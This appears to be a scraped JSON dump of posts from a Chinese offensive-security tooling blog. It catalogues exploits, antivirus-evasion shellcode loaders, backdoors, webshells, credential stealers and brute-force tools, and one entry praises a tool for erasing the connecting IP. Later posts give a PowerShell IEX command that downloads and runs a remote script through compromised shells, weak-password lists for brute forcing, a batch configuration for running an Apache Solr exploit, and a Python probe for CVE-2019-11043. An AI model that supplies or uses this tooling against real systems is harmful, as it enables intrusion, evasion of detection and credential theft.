exploit.rar [+] 漏洞利用 CVE-2018-2628 Weblogic GetShell EXPLOIT [+] 漏洞利用 ColdFusion 8 LFI EXP [+] 漏洞利用 K8_TomcatExp_1124[K.8].rar [+] 漏洞利用 WordPress 4.2 XSS 0day 20150429[K.8].rar [+] 漏洞利用 k8_zabbix_exp_20160820[K.8].rar 漏洞利用 [+] 漏洞利用 K8飞刀-EXPLOIT内含20个程序EXP（Drupal、Joomla、Wordpress、Vbulletin、Xampp、Zimbra、ThinkPHP、Magento、Discuz） [+] 漏洞利用 K8_Struts2_EXP (S2-045、devMode、S2-037、S2-032、S2-020、S2-019、S2-016、S2-013、S2-009、S2-005) [+] 漏洞利用 K8 DotNetNuke DNNspot Store =3.0 GetShell exploit.rar [+] 漏洞利用 CVE-2018-2628 Weblogic GetShell EXPLOIT [+] 漏洞利用 ColdFusion 8 LFI EXP [+] 漏洞利用 K8_TomcatExp_1124[K.8].rar [+] 漏洞利用 WordPress 4.2 XSS 0day 20150429[K.8].rar [+] 漏洞利用 k8_zabbix_exp_20160820[K.8].rar 漏洞利用 [+] 漏洞利用 K8飞刀-EXPLOIT内含20个程序EXP（Drupal、Joomla、Wordpress、Vbulletin、Xampp、Zimbra、ThinkPHP、Magento、Discuz） [+] 漏洞利用 K8_Struts2_EXP (S2-045、devMode、S2-037、S2-032、S2-020、S2-019、S2-016、S2-013、S2-009、S2-005) [+] 漏洞利用 K8 DotNetNuke DNNspot Store =3.0 GetShell exploit.rar [+] 漏洞利用 CVE-2018-2628 Weblogic GetShell EXPLOIT [+] 漏洞利用 ColdFusion 8 LFI EXP [+] 漏洞利用 K8_TomcatExp_1124[K.8].rar [+] 漏洞利用 WordPress 4.2 XSS 0day 20150429[K.8].rar [+] 漏洞利用 k8_zabbix_exp_20160820[K.8].rar [+] 漏洞利用 K8_Ecshop_Exploit [+] 漏洞利用 Magento 1.7.0.2 漏洞EXP_20150624[K.8].rar [+] 漏洞利用 K8COOKIE.rar Cookie注入工具 [+] 漏洞利用 Jboss_invoke_Exp_k8.rar MSF脚本 [+] 漏洞利用 DB_Owner_GetShell_K8.rar MSSQL DB权限拿SHELL工具 挂马工具 [+] 挂马工具 K8domainVBS.exe K8域控植入脚本生成器 [+] 挂马工具 K8ARPTool.rar 内网ARP工具批量挂马 [+] 挂马工具 CHM网马生成器.exe [+] 0day漏洞 K8飞刀内置5个0day漏洞利用(Word漏洞\\IE神洞\\WVS\\RAR) [+] 0day漏洞 [视频]BT5 MSF JAVA 0day CVE-2013-0422 Exploit Demo By K8team.rar [+] 0day漏洞 [视频]Hacking Team Flash 0day样本(Firefox IE)完美触发_20150707[K8].rar 漏洞环境 [+] 漏洞环境 K8-ASP注入漏洞环境.rar [+] 漏洞环境 k8bbs(php+mysql)注入漏洞环境.rar [+] 漏洞环境 K8 SQL强化练习工具V1.0_20190301[K8].rar [+] 漏洞环境 K8迷你ASP服务器.exe 绿色一键启动 免杀工具 [+] 免杀工具 scrunBase64 ShellCode免杀加载器(CS & MSF) [+] 免杀工具 scrunBase32 ShellCode免杀加载器(CS & MSF) [+] 免杀工具 scrun.exe & scrun.py ShellCode免杀加载器(CS & MSF) [+] 免杀工具 K8_SC_ENCODE(CS & Msf免杀工具).rar [+] 测试工具 K8shellcodeLoader.exe Shellcode测试 [+] 免杀工具 K8随机免杀花指令生成器V2.0.exe [+] 免杀工具 K8数字签名添加器.exe [+] 捆绑工具 K8免杀系统自带捆绑器加强版V2.0.EXE 远控后门 [+] 远控后门 K8_Gh0st_Bin.rar 不免杀漏洞测试上线用 [+] 远控后门 TeamServer.exe CS中转Win版,无需Kali下生成cobaltstrike.store文件 [+] 远控后门 QQ远控 ClientKey 利用工具.rar 不免杀18年仍然可用19年未测估计也还行 [+] 远控后门 vncdoor.exe VNC后门可正反向 [+] 远控后门 k8_SSH_Manage.exe 渗透专用SSH(执行完后立即销毁会话,不像putty保存会话常暴露IP) [+] 连接工具 sshcmd.exe 渗透专用SSH(执行完后立即销毁会话,同时清除连接IP) [+] 连接工具 sshshell.exe 交互式SSH类似putty保持会话(目标显示IP一直连着) [+] 远控后门 K8手机远控电脑V1.1_20121020[K.8].rar [+] 远控后门 JspShellExec CMD下JSP一句话连接工具 [+] 捆绑工具 K8_rarBind.rar RAR捆绑工具 嗅探工具 [+] 嗅探工具 K8getPC.py 内网存活主机探测(无需端口\\无视防火墙) 扫描工具 [+] 扫描工具 K8Cscan5.0.rar 大型内网渗透扫描器内置22个功能,支持Cobalt Strike [+] 扫描工具 K8PortScan开源跨平台大型网络端口扫描器(Bin: Windows/Kali/SUSE) [+] 扫描插件 K8Cscan Moudle WebLogicScan.rar Weblogic通用GetShell [+] 扫描插件 K8Cscan Moudle CiscoScan.rar Cisco思科探测插件 [+] 扫描插件 K8Cscan Moudle OSScan2.rar 系统版本探测插件2 [+] 扫描插件 K8Cscan Moudle PortScan.cs 端口扫描插件源码 [+] 扫描插件 K8Cscan Moudle FtpScan.rar Ftp密码扫描插件 [+] 扫描插件 K8Cscan Moudle MysqlScan.rar Mysql密码扫描插件 [+] 扫描插件 K8Cscan Moudle OnlinePC.rar 存活主机扫描插件 [+] 扫描插件 K8Cscan Moudle WebBanner.rar WebBanner标题扫描插件 [+] 扫描插件 K8Cscan Moudle WmiScan.rar Wmi扫描Win系统密码插件 [+] 扫描工具 K8Cscan for SameWeb.rar C段旁站扫描工具 [+] 扫描工具 K8Cscan for SubDomain.rar 子域名扫描工具 [+] 扫描工具 cping3.0.rar 大型内外网渗透主机扫描工具 [+] 扫描工具 K8_C段旁注工具6.0 [+] 扫描工具 s加强版.exe [+] 扫描工具 K8openssl批量 Bat版.rar [+] 扫描工具 K8破壳SMTP Bat版.rar [+] 扫描工具 WPdetection.exe WordPress站点信息获取 [+] 扫描工具 K8-S2批量.rar Struts2批量工具 [+] 扫描工具 smbcheck.exe MS17-010漏洞检测，cping、cscan批量专用 数据库 [+] 脱库工具 K8mysqlCmd.rar Mysql数据库免驱连接工具 [+] 脱库工具 K8_mysql脱裤20170114(千万).php [+] 脱库工具 K8Packwebshell.aspx 整站打包工具 [+] 脱库工具 K8outSQL.aspx MSSQL导库工具 加密解密 [+] K8飞刀里大量加密解密算法、编码解码、SQL注入、XSS等 [+] 密码破解 SharpWeb.exe 浏览器帐密读取工具(Firefox/Chorme/IE) [+] 密码破解 laZagne.exe 本地密码检索工具(支持XP/2003) [+] 密码破解 sshtest.exe SSH密码登陆测试可结合Cscan进行批量破解 [+] 嗅探工具 k8ftpsniffer.py FTP [+] 密码破解 K8_DNN_Password_Decrypt_20161110.rar dotnetnuke密码解密工具 [+] 密码破解 Invoke-Mimikatz.ps1 Mimikatz 20181209 [+] 密码破解 mz.exe Mimikatz-2.1.1-20181209 X86 一键版 [+] 密码破解 mz64.exe Mimikatz-2.1.1-20181209 X64 一键版 [+] 密码破解 K8_FTP爆破PHP脚本20151010.rar 内网渗透用 [+] 密码破解 K8_Mysql爆破PHP脚本20151009.rar 内网渗透用 [+] 密码破解 K8_ipcscan 爆破IPC自动种马工具+教程.rar [+] 密码破解 weblogic密码解密工具(exe & jar) [+] 密码破解 K8fuckVNC.rar k8vncpwd.exe VNC密码解密工具 [+] 密码破解 K8getTeamViewPWD_20150705[K.8].rar [+] 密码破解 K8正方密码解密工具_20150801[K.8].rar [+] 密码破解 getBrowserPWD_1124[K.8].rar Firefox\\Ghrome 浏览器密码读取工具 [+] 密码破解 getvpnpwd.exe VPN、ADSL宽带帐密读取工具(仅限XP、2003) [+] 密码破解 GetPassword_x64.rar GetPwd_K8.rar 一键获取明文 [+] 密码破解 K8_FuckOneShell 一句话密码爆破秒破10万 [+] 加密解密 K8Base32_Decode_20161110.rar [+] 斛密工具 k8ungzip.exe GZIP 用于提取0day网马Powershell执行PAYLOAD [+] 密码破解 K8FTP密码破解器V2.0_20190301[K8].rar [+] 密码破解 K8Access数据库密码读取器_20190301[K8].rar [+] 加密工具 K8_FileHideImg.exe 任意文件隐藏至图片工具 安全辅助 [+] 安全工具 K8木马病毒后门监视器V3.0.rar 捆绑后门木马释放路径、Shell上传路径查看 [+] 安全工具 K8进程拦截.rar (比方说访问网页浏览器调用外站EXE执行说明0day来了,而且可防止木马运行) [+] 安全工具 K8驱动防止WebShell提权工具.rar (就是说无法通过WEBSHELL执行任意命令,就算有签名的EXE也不行) [+] 辅助工具 K8注册表跳转.exe 转发代理 [+] 端口转发 PortTran.rar .NET端口转发工具 [+] 端口转发 K8PortMap.exe D7端口映射工具 WebShell [+] 转换工具 k8exe2bat.exe 任意文件转Bat工具(WebShell无法上传EXE解决方案) [+] 上传工具 K8upload_1125[K8].rar 新型小马上传工具支持任意文件(内置asp\\php\\jsp小马) [+] 连接工具 K8一句话ASP木马客户端加强程序版.exe [+] WebShell k8cmd.ascx [+] WebShell k8cmd.pl [+] WebShell k8cmd.py [+] WebShell k8飞刀CMD.jsp [+] WebShell K8飞刀A专用UA一句话木马.asp [+] WebShell K8飞刀PHP-专用UA一句话木马.php [+] WebShell K8飞刀专用UA一句话木马.asxp [+] WebShell shellcode.aspx 硬件渗透 [+]BadUSB K8飞刀 内含有大量Teensy渗透功能脚本自行研究 [+]BadUSB Teensy 兼容所有Windows和Linux系统下载者.ino 其它工具 [+]教程录制 K8屏幕录像 高压缩率版_20190301[K8].rar [+]系统美化 K8文件夹个性设置工具.exe [+]系统美化 K8个性桌面右键菜单.exe [+]搜索工具 K8吉他谱搜索工具_20190301[K8].rar [+]系统美化 图标提取器.exe [+]系统美化 k8cmd.exe [+]辅助工具 K8侠盗猎车4外挂.exe [+]辅助工具 K8迅雷、快车、旋风地址互换工具.exe","categories":[{"name":"工具","slug":"Tool","permalink":"http://k8gege.org/categories/Tool/"}],"tags":[{"name":"Tool","slug":"Tool","permalink":"http://k8gege.org/tags/Tool/"},{"name":"K8tools","slug":"K8tools","permalink":"http://k8gege.org/tags/K8tools/"}]},{"title":"Ladon Scanner For PowerShell","slug":"Ladon Scanner For PowerShell","date":"2019-12-27T13:10:00.000Z","updated":"2020-01-10T16:01:29.007Z","comments":true,"path":"p/673c210e.html","link":"","permalink":"http://k8gege.org/p/673c210e.html","excerpt":"","text":"程序简介Ladon一款用于大型网络渗透的多线程插件化综合扫描神器，含端口扫描、服务识别、网络资产、密码爆破、高危漏洞检测以及一键GetShell，支持批量A段/B段/C段以及跨网段扫描，支持URL、主机、域名列表扫描。5.5版本内置39个功能模块,通过多种协议以及方法快速获取目标网络存活主机IP、计算机名、工作组、共享资源、网卡地址、操作系统版本、网站、子域名、中间件、开放服务、路由器、数据库等信息，漏洞检测包含MS17010、Weblogic、ActiveMQ、Tomcat、Struts2等，密码爆破11种含数据库(Mysql、Oracle、MSSQL)、FTP、SSH(Linux主机)、VNC、Windows密码(IPC、WMI、SMB)、Weblogic后台、Rar压缩包密码等，Web指纹识别模块可识别75种（Web应用、中间件、脚本类型、页面类型）等，可高度自定义插件POC支持.NET程序集、DLL(C#/Delphi/VC)、PowerShell等语言编写的插件,支持通过配置INI批量调用任意外部程序或命令，EXP生成器可一键生成漏洞POC快速扩展扫描能力。Ladon支持Cobalt Strike插件化扫描快速拓展内网进行横向移动。 使用说明 ID 主题 URL 1 Ladon文档主页 https://github.com/k8gege/Ladon/wiki 2 基础用法详解 https://github.com/k8gege/Ladon/wiki/Ladon-Usage 3 Cobalt Strike https://github.com/k8gege/Ladon/wiki/Ladon-&amp;-Cobalt-Strike 4 Exp生成器使用 https://github.com/k8gege/Ladon/wiki/LadonExp-Usage 5 高度自定义插件 https://github.com/k8gege/Ladon/wiki/Ladon-Diy-Moudle 6 外部模块参考 https://github.com/k8gege/K8CScan/wiki 7 PowerLadon https://github.com/k8gege/Ladon/wiki/Ladon-&amp;-PowerShell 8 PythonLadon https://github.com/k8gege/PyLadon 9 LinuxLadon https://github.com/k8gege/LinuxLadon 10 漏洞演示视频 https://github.com/k8gege/K8CScan/tree/master/Video PowerLadonPowerLadon完美兼容win7-win10 PowerShell，对于不支持.net程序插件化的远控，可使用PowerShell版,也可CMD命令行下远程加载内存实现无文件扫描，模块加载后用法和EXE一致。Ladon.ps1脚本由EXE转换而成，具备EXE版所有功能,相关功能使用请查看Ladon说明文档。 下载最新版本 https://github.com/k8gege/Ladon历史版本 https://github.com/k8gege/PowerLadon 0x001 PowerShell本地加载适用于支持PowerShell交互远控或Shell，如Cobalt Strike 123&gt; powershell &gt; Import-Module .\\Ladon.ps1&gt; Ladon OnlinePC 0x002 Cmd本地加载适用于还没跟上时代的远控或Shell只支持CMD交互 1&gt; powershell Import-Module .\\Ladon.ps1;Ladon OnlinePC 0x003 Cmd远程加载适用于还没跟上时代的远控或Shell只支持CMD交互 1&gt; powershell \"IEX (New-Object Net.WebClient).DownloadString('http://192.168.1.5:800/Ladon.ps1'); Ladon OnlinePC\" 0x004 远控交互式CMD 0x005 菜刀非交互CMD 0x006 Empire非交互CMDEmpire的shell有点问题，分号被截断，可以加个cmd /c 0x007 MSF交互式CMD","categories":[{"name":"工具","slug":"Tool","permalink":"http://k8gege.org/categories/Tool/"},{"name":"Ladon","slug":"Ladon","permalink":"http://k8gege.org/categories/Ladon/"},{"name":"PowerShell","slug":"PowerShell","permalink":"http://k8gege.org/categories/PowerShell/"}],"tags":[{"name":"Ladon","slug":"Ladon","permalink":"http://k8gege.org/tags/Ladon/"},{"name":"Tool","slug":"Tool","permalink":"http://k8gege.org/tags/Tool/"},{"name":"PowerShell","slug":"PowerShell","permalink":"http://k8gege.org/tags/PowerShell/"}]},{"title":"2011-2019年Top100弱口令密码字典","slug":"top100_password","date":"2019-12-21T13:30:24.000Z","updated":"2020-01-10T16:01:29.054Z","comments":true,"path":"p/16172.html","link":"","permalink":"http://k8gege.org/p/16172.html","excerpt":"","text":"2019年最差密码123456近日，在评估网上泄漏的500万个密码后，密码管理公司SplashData发布了2019年度最糟糕密码榜单，123456连续两年蝉联冠军，根据统计共有超过281万人使用；第二名的123456，统计共有超过248万人使用；第三名的123456789，统计共有超过105万人使用，1990、1991、1992也在榜上。 据了解，SplashData公布的最差密码100强，是从密码管理服务SplashID、TeaMSID、Gpass收集得来。除了数字之外，还有“qwerty”、“password”等。 观察前200名安全性最差的常用密码排行榜单，之所以很容易被窃取盗用，其共同特色就是很容易被猜到，烂密码可以归纳为5大类：使用简易数字组合（如12345）；键盘垂直或水平排列组合（如qwerty、1qaz2wsx）；体育相关单词；姓名相关和与食物相关的单词。 看看你的密码在里面吗？ 国外网民密码2011-2018 国外网民密码201912345612345679qwerty1234567811111112345678901234567password123123987654321qwertyuiopmynoob12332166666618atcskd2w77777771q2w3e4r6543215555553rjs1la7qegoogle1q2w3e4r5t123qwezxcvbnm1q2w3e 服务器SSH/VPS密码Top100PublishThisListPleaseroot!@wubaopassword123456admin123451234p@ssw0rd1231jiamimatestroot123!!q@w!qaz@wsxidc!@admin!@ alpineqwerty123456781111111234567891q2w3e4r123123default1234567qwe1231qaz2wsx1234567890abcd1234000000usertoorqwer12341q2w3easdf1234redhat1234qwercisco12qwaszxtest1231q2w3e4r5tadmin123changeme1qazxsw2123qweasdq1w2e3r4letmeinserverroot1234masterabc123rootrootasystempass1qaz2wsx3edcp@$$w0rd112233welcome!QAZ2wsxlinux123321manager1qazXSW@q1w2e3r4t5oracleasd123admin123456ubnt123qweqazwsxedcadministratorsuperuserzaq12wsx121212654321ubuntu0000zxcvbnmroot@1231111vmwareq1w2e3qwerty123cisco12311111111pa55w0rdasdfgh11111123abcasdfcentos88888854321password123 中国网民密码Top100123456789a123456123456a1234567891234567890woaini1314qq123456abc123456123456a123456789a147258369zxcvbnm98765432112345678910abc123qq123456789123456789.7708801314520woaini5201314520q123456123456abc1233211234567123123123123456.0123456789asd123456aa123456135792468q123456789abcd12345612345678900woaini520woaini123zxcvbnm1231111111111111111w123456aini1314abc123456789111111woaini521qwertyuiop13145205201234567891qwe123456asd12300000014725836901357924680789456123123456789abcz1234561234567899aaa123456abcd1234www123456123456789q123abcqwe123w1234567897894561230123456qqzxc123456123456789qq111111111111111111100000000000000001234567891234567qazwsxedcqwerty123456..zxc123asdfghjkl00000000001234554321123456q123456aa9876543210110120119qaz123456qq52013141236987455201314000000000as1234561231235841314520z12345678952013145201314a123123caonimaa5201314wang123456abcd123123456789..woaini1314520123456asdaa123456789741852963a12345678 越南网民密码Top100123456123456789123123111111anhyeuem123456712345678912345612345678000000asdasd252513251234567890121212123321zxcvbnmqweqwe456789112233aaaaaa12312312398765432111111111qwerty147258369maiyeuem123qwe654321iloveyou123654999999qqqqqq1111111147258hota407anhtuan22222215975311223344anhnhoemanh123159357qwertyuiopasd123987654321emyeuanhmmmmmm12345666666anhanh123789phuong111222qweasdhanoiyeudaunguyen7894561111111111mylove78945612319001560qwe123asdfghjklppppppanhhung1234560abc123maiyeu123456azzzzzzquangninh987654555555tuananhasasasasdfghzxcvbn321321tinhyeu147852369456123matkhau14785212345678910thienthananhyeu111111111toilatoi10cham0147258369456456khongbiet789789a123456333333888888123654789truongmaimaiyeuemhhhhhh 完整字典下载https://github.com/k8gege/PasswordDic","categories":[{"name":"密码","slug":"Pass","permalink":"http://k8gege.org/categories/Pass/"}],"tags":[{"name":"Brute","slug":"Brute","permalink":"http://k8gege.org/tags/Brute/"},{"name":"Password","slug":"Password","permalink":"http://k8gege.org/tags/Password/"}]},{"title":"Apache Solr <=8.2.0 Velocity Template 0day Exploit","slug":"Apache Solr =8.2.0 Velocity Template 0day Exploit","date":"2019-12-18T16:00:00.000Z","updated":"2020-01-10T15:13:19.605Z","comments":true,"path":"p/61341.html","link":"","permalink":"http://k8gege.org/p/61341.html","excerpt":"","text":"环境下载Solr 8.2.0添加core,默认配置即可。7.x版本自带core 配置0x001 批量URL配置Cscan.ini[Cscan]exe=F:\\Python279\\python.exearg=exp.py $ip$ whoami0x002 批量C段配置Cscan.ini[Cscan]exe=F:\\Python279\\python.exearg=exp.py http://$ip$:8983 whoami 利用单个: python exp.py url cmd 或 Cscan url批量C段: Cscan 192.168.1.8/24批量URL: Cscan (同目录放url.txt) 下载Exp: https://github.com/k8gege/SolrExpCscan: https://github.com/k8gege/K8CScan","categories":[{"name":"Exp","slug":"Exp","permalink":"http://k8gege.org/categories/Exp/"},{"name":"工具","slug":"Tool","permalink":"http://k8gege.org/categories/Tool/"}],"tags":[{"name":"Apache","slug":"Apache","permalink":"http://k8gege.org/tags/Apache/"},{"name":"Solr","slug":"Solr","permalink":"http://k8gege.org/tags/Solr/"},{"name":"Exp","slug":"Exp","permalink":"http://k8gege.org/tags/Exp/"},{"name":"Ladon","slug":"Ladon","permalink":"http://k8gege.org/tags/Ladon/"},{"name":"0day","slug":"0day","permalink":"http://k8gege.org/tags/0day/"}]},{"title":"Ladon POC CVE-2019-11043 PHP-FPM","slug":"CVE-2019-11043 (PHP-FPM + Ngnix)","date":"2019-12-18T15:30:00.000Z","updated":"2020-01-10T15:18:29.469Z","comments":true,"path":"p/41162.html","link":"","permalink":"http://k8gege.org/p/41162.html","excerpt":"","text":"漏洞简介PHP-FPM 远程代码执行漏洞(CVE-2019-11043) 在长亭科技举办的 Real World CTF 中,国外安全研究员 Andrew Danau 在解决一道 CTF 题目时发现,向目标服务器 URL 发送 %0a 符号时,服务返回异常,疑似存在漏洞。 在使用一些有错误的Nginx配置的情况下,通过恶意构造的数据包,即可让PHP-FPM执行任意代码。 Example和Ladon.exe放在同一目录,即可对C段或url.txt进行批量检测 123456789Ladon CVE-2019-11043_Poc.ini 批量URL检测(根目录下放url.txt)Ladon 192.168.1.37/24 CVE-2019-11043_Poc.ini 批量检测C段主机是否存在该漏洞Ladon http://192.168.1.37:8080/index.php CVE-2019-11043_Poc.ini 指定URLLadon 5.5By K8gegeCall AnyExe/Commandhttp://192.168.1.37:8080/index.phpload F:\\Python279\\python.exeISVUL: CVE-2019-11043 http://192.168.1.37:8080/index.php 12345678910111213141516171819202122232425262728293031323334353637383940414243import requestsimport sys# Ladon POC by k8gege# VUL: CVE-2019-11043 (PHP-FPM + Ngnix)# url need include .php Example：http://192.168.1.37:8080/index.php# CVE-2019-11043_POC.ini# [Ladon]# exe=F:\\Python279\\python.exe# arg=POC\\CVE-2019-11043-POC.py $ip$# Example# Ladon 192.168.1.37/24 poc/CVE-2019-11043_Poc.ini# Ladon http://192.168.1.37:8080/index.php poc/CVE-2019-11043_Poc.ini# Result# Ladon 5.5# Call AnyExe/Command# http://192.168.1.37:8080/index.php# load F:\\Python279\\python.exe# ISVUL: CVE-2019-11043 http://192.168.1.37:8080/index.phpdef checkpoc(url): try: headers = &#123;\"User-Agent\": \"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:6.0) Gecko/20100101 Firefox/6.0\"&#125; res1 = requests.get(url, headers=headers) if res1.status_code == 200: print \"URL: \"+url for i in range(1499, 1900): res = requests.get(url + \"/PHP%0Ais_poc_thistiest_lang.php?\" + \"K\" * i, headers=headers) if res.status_code == 502: print(\"ISVUL: CVE-2019-11043 \"+url) break except: passurl = sys.argv[1]if \"http\" in url: checkpoc(url)else: checkpoc(\"http://\"+url+\"/index.php\") checkpoc(\"http://\"+url+\":8080/index.php\")checkpoc(\"https://\"+url+\"/index.php\") 下载Poc: https://github.com/k8gege/CVE-2019-11043Ladon: https://github.com/k8gege/Ladon","categories":[{"name":"Exp","slug":"Exp","permalink":"http://k8gege.org/categories/Exp/"},{"name":"工具","slug":"Tool","permalink":"http://k8gege.org/categories/Tool/"},{"name":"Ladon","slug":"Ladon","permalink":"http://k8gege.org/categories/Ladon/"}],"tags":[{"name":"Ladon","slug":"Ladon","permalink":"http://k8gege.org/tags/Ladon/"},{"name":"Code","slug":"Code","permalink":"http://k8gege.org/tags/Code/"},{"name":"Poc","slug":"Poc","permalink":"http://k8gege.org/tags/Poc/"},{"name":"PHP","slug":"PHP","permalink":"http://k8gege.org/tags/PHP/"},{"name":"Ngnix","slug":"Ngnix","permalink":"http://k8gege.org/tags/Ngnix/"},{"name":"CVE-2019-11043","slug":"CVE-2019-11043","permalink":"http://k8gege.org/tags/CVE-2019-11043/"}]},{"title":"Ladon for Kali 2019","slug":"KaliLadon","date":"2019-12-10T12:50:00.000Z","updated":"2020-01-10T16:01:28.991Z","comments":true,"path":"p/dc4a2cb7.html","link":"","permalink":"http://k8gege.org/p/dc4a2cb7.html","excerpt":"","text":"前言无论内网还是外网渗透信息收集都是非常关键，信息收集越多越准确渗透的成功率就越高。但成功率还受到漏洞影响，漏洞受时效性影响，对于大型内网扫描速度直接影响着成功率。漏洞时效性1-2天，扫描内网或外网需1周时间，是否会因此错过很多或许可成功的漏洞？对于那些拥有几百上千域名的大站来说，你发现越快成功率就越高，慢管理员就打补丁了。因此我们需要一个支持批量C段/B段甚至A段的扫描器，添加自定义模块快速检测新出漏洞。 程序简介Ladon一款用于大型网络渗透的多线程插件化综合扫描神器，含端口扫描、服务识别、网络资产、密码爆破、高危漏洞检测以及一键GetShell，支持批量A段/B段/C段以及跨网段扫描，支持URL、主机、域名列表扫描。5.7版本内置40个功能模块,通过多种协议以及方法快速获取目标网络存活主机IP、计算机名、工作组、共享资源、网卡地址、操作系统版本、网站、子域名、中间件、开放服务、路由器、数据库等信息，漏洞检测包含MS17010、Weblogic、ActiveMQ、Tomcat、Struts2等，密码爆破11种含数据库(Mysql、Oracle、MSSQL)、FTP、SSH(Linux主机)、VNC、Windows密码(IPC、WMI、SMB)、Weblogic后台、Rar压缩包密码等，Web指纹识别模块可识别75种（Web应用、中间件、脚本类型、页面类型）等，可高度自定义插件POC支持.NET程序集、DLL(C#/Delphi/VC)、PowerShell等语言编写的插件,支持通过配置INI批量调用任意外部程序或命令，EXP生成器可一键生成漏洞POC快速扩展扫描能力。Ladon支持Cobalt Strike插件化扫描快速拓展内网进行横向移动。 使用简单虽然Ladon功能丰富多样,但使用却非常简单,任何人都能轻易上手只需一或两个参数就可用90%的功能,一个模块相当于一个新工具 测试环境Kali 2019.4 x64Ubuntu 18.04 x64 安装monolinux下需mono运行环境，Kali和Ubuntu安装命令通用。其它系统未进行测试，喜欢用其它Linux系统自行测试。 1apt install mono-runtime 运行Ladon1mono Ladon OnlinePC 可用功能由于mono的兼容性问题，不保证Linux下所有功能均可用就对于Ladon功能的测试来看Kali的兼容性要比Ubuntu好测试发现有些功能的稳定性以及速度没有Windows系统快未列功能系未测试或暂不可用功能，使用前请先看说明在Kali 2019.4下测试，Ladon支持以下所列的27种功能============================================= ID 模块 说明 1 WebDir Web目录扫描 2 UrlScan URL域名扫描（不验IP） 3 PhpStudyPoc PhpStudy后门扫描 4 WebScan Web信息扫描 5 MysqlScan Mysql口令检测 6 OracleScan Oracle口令检测 7 VncScan Vnc口令检测 8 HttpDownLoad Http下载 9 FtpDownLoad Ftp下载 10 WhatCMS 75种CMS识别 11 FtpScan Ftp口令检测 12 PortScan PortScan端口扫描 13 SmbScan Smb口令检测 14 SameWeb 站点域名扫描（验证IP） 15 MS17010 MS17010漏洞扫描 16 OnlinePC 存活主机扫描 17 OnlineIP 存活主机IP扫描 18 HostIP 主机名解析IP 19 DomainIP 子域名解析IP 20 EnBase64 批量Base64密码加密 21 DeBase64 批量Base64密码解密 22 EnHex 批量Hex密码加密 23 DeHex 批量Hex密码解密 24 OsScan 系统版本探测 25 SubDomain 子域名爆破 26 SshScan SSH口令检测 27 *.ps1 无PowerShell执行脚本 暂不支持功能=============================================Struts2Poc X不支持TomcatScan X不支持HttpBasicScan X不支持，只能检测是否401认证URL，无法爆破WeblogicPoc X 竟然不支持(Win下mono也不支持，显然mono问题)MssqlScan X不支持只能扫到开放端口IpcScan X不支持(因为调用cmd命令) MS17010漏洞扫描 PortScan端口扫描 存活主机扫描 存活主机IP扫描可能IP需要用于其它用途，故提供只输出IP功能 Ftp口令检测 Smb口令检测 75种CMS识别 子域名爆破 系统版本探测 主机名解析IP 子域名解析IP SSH口令检测 加载PowerShell插件 PhpStudy后门扫描 URL域名扫描（不验IP） 站点域名扫描（验证IP） Web信息扫描 Web目录扫描 Mysql口令检测 Oracle口令检测 Vnc口令检测 Http/Ftp下载 Base64密码加解密 Hex密码加解密 使用说明 ID 主题 URL 1 Ladon文档主页 https://github.com/k8gege/Ladon/wiki 2 基础用法详解 https://github.com/k8gege/Ladon/wiki/Ladon-Usage 3 Cobalt Strike https://github.com/k8gege/Aggressor 4 Exp生成器使用 https://github.com/k8gege/Ladon/wiki/LadonExp-Usage 5 高度自定义插件 https://github.com/k8gege/Ladon/wiki/Ladon-Diy-Moudle 6 外部模块参考 https://github.com/k8gege/K8CScan/wiki 7 PowerLadon https://github.com/k8gege/powerladon 8 PythonLadon https://github.com/k8gege/PyLadon 9 KaliLadon https://github.com/k8gege/KaliLadon 10 漏洞演示视频 https://github.com/k8gege/K8CScan/tree/master/Video 源码编译git clone https://github.com/k8gege/Ladon.git使用VS2012或以上版本分别编译.net 3.5、4.0版本EXE 成品下载https://github.com/k8gege/Ladon/releasesWin7/2008或安装.net 2.x 3.x系统可使用Ladon.exeWin8-win10或安装.net 4.x系统可使用Ladon40.exe","categories":[{"name":"工具","slug":"Tool","permalink":"http://k8gege.org/categories/Tool/"},{"name":"Kali","slug":"Kali","permalink":"http://k8gege.org/categories/Kali/"},{"name":"Ladon","slug":"Ladon","permalink":"http://k8gege.org/categories/Ladon/"}],"tags":[{"name":"Ladon","slug":"Ladon","permalink":"http://k8gege.org/tags/Ladon/"},{"name":"Tool","slug":"Tool","permalink":"http://k8gege.org/tags/Tool/"},{"name":"Kali","slug":"Kali","permalink":"http://k8gege.org/tags/Kali/"},{"name":"Scanner","slug":"Scanner","permalink":"http://k8gege.org/tags/Scanner/"}]},{"title":"Ladon插件实例内网Web扫描C#源码","slug":"Ladon Moudle WebBanner Demo","date":"2019-12-08T05:36:24.000Z","updated":"2020-06-11T16:18:04.235Z","comments":true,"path":"p/da863d02.html","link":"","permalink":"http://k8gege.org/p/da863d02.html","excerpt":"","text":"获取网页标题、服务器Banner，例子仅探测80端口大家可自行修改添加其它端口识别定制Web扫描功能如识别出特定中间件或WEB后再检测是否存在漏洞等编译后的netscan.dll可改成任意名称Ladon均可加载 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149using System;using System.Collections.Generic;using System.Text;using System.Net;using System.Text.RegularExpressions;namespace LadonDLL&#123; public class scan &#123; public static string run(string ip) &#123; if (string.IsNullOrEmpty(ip)) return &quot;&quot;; else &#123; &#x2F;&#x2F;192.11.22.10 Microsoft-IIS&#x2F;10.0 IIS Windows &#x2F;&#x2F;192.11.22.1 H3C-Miniware-Webs ER3200G2系统管理 return ip + &quot;\\t&quot; + getURLbanner(ip) + &quot;\\t&quot; + GetTitle(getHtml(&quot;http:&#x2F;&#x2F;&quot; + ip,2)); &#125; &#125; private static string getURLbanner(string url) &#123; &#x2F;&#x2F;&#x2F;&#x2F;HttpWebResponse res; if (!url.ToLower().Contains(&quot;https:&#x2F;&#x2F;&quot;) &amp;&amp; !url.ToLower().Contains(&quot;http:&#x2F;&#x2F;&quot;)) url &#x3D; &quot;http:&#x2F;&#x2F;&quot; + url; try &#123; var req &#x3D; (HttpWebRequest)WebRequest.CreateDefault(new Uri(url)); req.Method &#x3D; &quot;HEAD&quot;; req.Timeout &#x3D; 1000; var res &#x3D; (HttpWebResponse)req.GetResponse(); if (res.StatusCode &#x3D;&#x3D; HttpStatusCode.OK || res.StatusCode &#x3D;&#x3D; HttpStatusCode.Forbidden || res.StatusCode &#x3D;&#x3D; HttpStatusCode.Redirect || res.StatusCode &#x3D;&#x3D; HttpStatusCode.MovedPermanently) &#123; return res.Server; &#125; 